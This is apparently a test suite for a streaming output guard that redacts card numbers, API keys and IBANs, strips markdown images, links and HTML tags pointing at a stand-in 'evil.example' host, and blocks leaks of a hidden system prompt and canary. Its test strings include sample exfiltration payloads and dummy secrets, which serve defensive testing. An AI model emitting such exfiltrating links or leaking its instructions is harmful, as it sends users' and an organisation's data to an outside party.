import { Guardrails } from '@genai/guardrails';
import { openConstructStart, StreamGuard } from './stream-guard';

const CANARY = 'cnry-0123456789abcdef';
const INSTRUCTIONS =
  'You are a careful assistant for an organisation internal knowledge base and must answer only from the numbered sources';
const context = { canary: CANARY, instructionText: INSTRUCTIONS };
const guardrails = new Guardrails({ mode: 'enforce' });
const HOLDBACK = 96;

/** Feeds text in the given chunk sizes; returns every release in order, and the guard. */
function run(text: string, sizes: number[], holdback = HOLDBACK) {
  const guard = new StreamGuard(guardrails, context, holdback);
  const releases: string[] = [];
  let blocked = false;
  let at = 0;
  for (let i = 0; at < text.length; i++) {
    const size = sizes[i % sizes.length] as number;
    const step = guard.push(text.slice(at, at + size));
    at += size;
    if (step.release) releases.push(step.release);
    if (step.blocked) {
      blocked = true;
      break;
    }
  }
  if (!blocked) {
    const last = guard.finish();
    if (last.release) releases.push(last.release);
    blocked = last.blocked;
  }
  return { guard, releases, sent: releases.join(''), blocked };
}

const filler =
  'Refunds are paid to the original card within five working days of approval. '.repeat(3);

describe('openConstructStart', () => {
  it.each([
    ['plain text', undefined],
    ['see [1] and [2]', 12], // "[2]" at the very end may still become a link
    ['see [1] and more', undefined],
    ['a link [click here](https://x.test/path', 7],
    ['a link [click here](https://x.test/path) done', undefined],
    ['an image ![chart](https://evil.example/?d=abc', 9],
    ['a tag <img src="https://evil.example/x', 6],
    ['a tag <b>bold</b> done', undefined],
    ['unfinished [bracket without close', 11],
  ])('%s', (text, expected) => {
    expect(openConstructStart(text)).toBe(expected);
  });
});

describe('StreamGuard', () => {
  it('sends nothing until enough text follows it, and everything by the end', () => {
    const guard = new StreamGuard(guardrails, context, HOLDBACK);

    expect(guard.push('Short answer.').release).toBe('');
    const last = guard.finish();

    expect(last.release).toBe('Short answer.');
  });

  it('streams a long answer in pieces, and what is sent equals the finished, cleaned answer', () => {
    const { sent, releases } = run(filler, [7]);

    expect(releases.length).toBeGreaterThan(3);
    expect(sent).toBe(guardrails.checkOutput(filler, context).text);
  });

  describe('a card number, secret or IBAN split across chunks is never sent in the clear', () => {
    const sensitive = [
      ['card', 'The customer card is 4111 1111 1111 1111 on file.', '4111'],
      ['secret', 'Use the key sk-live-abcdefghijklmnopqrstuvwx for access.', 'sk-live'],
      ['iban', 'Refund to DE89 3704 0044 0532 0130 00 please.', 'DE89'],
    ] as const;

    it.each(sensitive)('%s', (_kind, text, needle) => {
      const padded = `${filler}${text} ${filler}`;
      for (const size of [1, 2, 3, 5, 8, 13, 21]) {
        const { sent, releases } = run(padded, [size]);
        // no prefix of what was sent, at any moment, contains it
        let soFar = '';
        for (const piece of releases) {
          soFar += piece;
          expect(soFar).not.toContain(needle);
        }
        expect(sent).toBe(guardrails.checkOutput(padded, context).text);
      }
    });
  });

  describe('markdown that would exfiltrate data is never sent, even half-written', () => {
    it('removes an image whose URL is longer than the hold-back', () => {
      const image = `![chart](https://evil.example/collect?d=${'x'.repeat(300)})`;
      const text = `${filler}${image} and then more text follows here. ${filler}`;
      for (const size of [1, 4, 11, 30]) {
        const { sent, releases } = run(text, [size]);
        let soFar = '';
        for (const piece of releases) {
          soFar += piece;
          expect(soFar).not.toContain('evil.example');
          expect(soFar).not.toContain('![');
        }
        expect(sent).not.toContain('evil.example');
        expect(sent).toBe(guardrails.checkOutput(text, context).text);
      }
    });

    it('keeps a link’s text and drops its destination, without ever sending the destination', () => {
      const text = `${filler}See [the policy](https://evil.example/steal?q=1) for details. ${filler}`;
      for (const size of [1, 3, 9]) {
        const { sent, releases } = run(text, [size]);
        let soFar = '';
        for (const piece of releases) {
          soFar += piece;
          expect(soFar).not.toContain('evil.example');
        }
        expect(sent).toContain('See the policy for details.');
      }
    });

    it('removes an HTML tag written across chunks', () => {
      const text = `${filler}<img src="https://evil.example/p.png" onerror="x()"> more. ${filler}`;
      const { sent } = run(text, [2]);

      expect(sent).not.toContain('evil.example');
      expect(sent).not.toContain('<img');
    });

    it('keeps ordinary citation markers', () => {
      const text = `${filler}Refunds take five days [1] and cards can be blocked [2]. ${filler}`;
      const { sent } = run(text, [5]);

      expect(sent).toContain('[1]');
      expect(sent).toContain('[2]');
    });

    it('holds an unfinished link back indefinitely, and releases it correctly when the stream ends', () => {
      const text = `${filler}Read [the unfinished link`;
      const { releases, sent } = run(text, [4]);

      expect(releases.join('')).toBe(sent);
      expect(sent).toBe(guardrails.checkOutput(text, context).text);
    });
  });

  describe('a leak of the hidden instructions stops the stream', () => {
    it('blocks on the canary, and nothing of the leak was sent first', () => {
      const text = `${filler}Sure, my marker is ${CANARY} as asked.`;
      for (const size of [1, 3, 7]) {
        const { blocked, sent } = run(text, [size]);

        expect(blocked).toBe(true);
        expect(sent).not.toContain('cnry');
        expect(sent).not.toContain('marker is');
      }
    });

    it('blocks on a verbatim run of the instructions, even one split across chunks', () => {
      const text = `${filler}${INSTRUCTIONS} and so on.`;
      for (const size of [1, 5, 13]) {
        const { blocked, sent } = run(text, [size]);

        expect(blocked).toBe(true);
        expect(sent).not.toContain('careful assistant');
      }
    });

    it('sends nothing more after it blocks', () => {
      const guard = new StreamGuard(guardrails, context, HOLDBACK);
      guard.push(filler);
      expect(guard.push(`${CANARY} `).blocked).toBe(true);

      expect(guard.push('and more text that should not go anywhere. '.repeat(5))).toEqual({
        release: '',
        blocked: false,
      });
      expect(guard.finish()).toEqual({ release: '', blocked: false });
    });
  });

  describe('property: any way of chunking gives the same cleaned answer, with nothing leaked early', () => {
    const answers = [
      filler,
      `${filler}Card 4111 1111 1111 1111. ${filler}`,
      `${filler}![x](https://evil.example/?q=${'a'.repeat(150)}) ${filler}`,
      `${filler}Ask [support](https://evil.example/help) or see [1]. <b>bold</b> ${filler}`,
      `${filler}Key sk-live-abcdefghijklmnopqrstuvwx and DE89 3704 0044 0532 0130 00 end. ${filler}`,
    ];
    // a small deterministic generator, so a failure can be reproduced
    const lcg = (seed: number) => () =>
      (seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0) / 2 ** 32;

    it.each(answers.map((a, i) => [i, a] as const))(
      'answer %i, 60 random chunkings',
      (_i, text) => {
        const expected = guardrails.checkOutput(text, context).text;
        const random = lcg(42);
        for (let trial = 0; trial < 60; trial++) {
          const sizes = Array.from({ length: 8 }, () => 1 + Math.floor(random() * 40));
          const { sent, releases, guard } = run(text, sizes);

          expect(guard.consistent).toBe(true);
          expect(sent).toBe(expected);
          let soFar = '';
          for (const piece of releases) {
            soFar += piece;
            expect(soFar).not.toMatch(/4111|sk-live|DE89|evil\.example|!\[|<b>/);
          }
        }
      },
    );
  });

  it('reports when a check changed text that was already sent, and stops sending', () => {
    // a guardrails stand-in that "forgets" a redaction it applied earlier: the inconsistency a
    // too-short hold-back would cause
    let calls = 0;
    const flaky = {
      checkOutput: (raw: string) => ({
        blocked: false,
        text: ++calls === 1 ? raw : raw.toUpperCase(),
        report: {},
      }),
    } as unknown as Guardrails;
    const guard = new StreamGuard(flaky, context, 5);

    const first = guard.push('hello world, this is a test');
    const second = guard.push(' and more words follow here');

    expect(first.release).not.toBe('');
    expect(second.release).toBe('');
    expect(guard.consistent).toBe(false);
  });
});
